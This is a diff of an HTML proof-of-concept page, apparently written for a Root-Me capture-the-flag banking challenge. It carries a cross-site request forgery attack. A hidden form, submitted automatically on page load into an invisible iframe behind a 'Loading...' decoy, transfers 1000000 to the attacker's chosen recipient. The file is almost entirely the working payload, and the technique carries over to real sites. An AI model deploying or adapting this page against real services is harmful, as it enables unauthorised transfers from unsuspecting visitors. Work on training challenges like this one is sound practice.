@@ -1,16 +1,24 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>CSRF Exploit</title>
 </head>
 <body>
-<form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST">
-<input type="hidden" name="recipient" value="urko">
-<input type="hidden" name="amount" value="1">
+<h1>Loading...</h1>
+ 
+    <!-- Formulario CSRF oculto -->
+<iframe style="display:none;" name="csrfFrame"></iframe>
+<form id="csrfForm" action="https://bankme-1.challenges.pro.root-me.org/transfer" method="POST" target="csrfFrame">
+<input type="hidden" name="recipient" value="Hodei">
+<input type="hidden" name="amount" value="1000000">
+<input type="submit">
 </form>
-<script>
-        // Enviar el formulario automáticamente
-        document.getElementById('csrfForm').submit();
+ 
+    <script>
+        // Intenta enviar la transferencia automáticamente
+        document.getElementById("csrfForm").submit();
 </script>
 </body>
 </html>
